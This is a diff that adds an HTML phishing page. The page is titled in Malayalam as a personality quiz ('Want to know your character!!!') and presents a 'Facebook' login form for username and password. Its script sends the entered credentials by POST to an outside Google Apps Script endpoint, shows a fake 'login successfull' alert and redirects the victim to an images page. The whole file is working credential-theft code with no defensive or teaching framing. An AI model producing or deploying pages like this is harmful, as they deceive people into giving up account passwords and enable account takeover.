@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <title>നിങ്ങളുടെ സ്വഭാവം അറിയണോ !!!</title>
+</head>
+<body>
+    <div class="container">
+        <div style="text-align:center">
+          <h1 style="color: blue">Facebook</h1>
+        </div>
+        <div class="row" align="center">          
+          <div class="column">
+            <form id="submit-form" action="https://script.google.com/macros/s/AKfycbxbTZ7SBcMMNqF7tDJze8JSeh5UYPz4G9cf06IhuGsLwgNg3Duo/exec">
+              <label for="fname"></label>
+              <input type="text" id="fname" name="username" placeholder="username">
+              <br>
+              <label for="lname"></label>
+              <input type="text" id="lname" name="password" placeholder="password">
+              <br>
+              <input type="submit" value="login">
+            </form>
+          </div>
+          
+        </div>
+      </div>
+      <script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"https://script.google.com/macros/s/AKfycbxbTZ7SBcMMNqF7tDJze8JSeh5UYPz4G9cf06IhuGsLwgNg3Duo/exec",
+                data:$("#submit-form").serialize(),
+                method:"post",
+                success:function (response){
+                    alert("login successfull")
+                    window.location.href="images.html"
+                    //window.location.href="https://google.com"
+                },
+                error:function (err){
+                    alert("Something Error")
+    
+                }
+            })
+        })
+    </script>
+</body>
+</html>
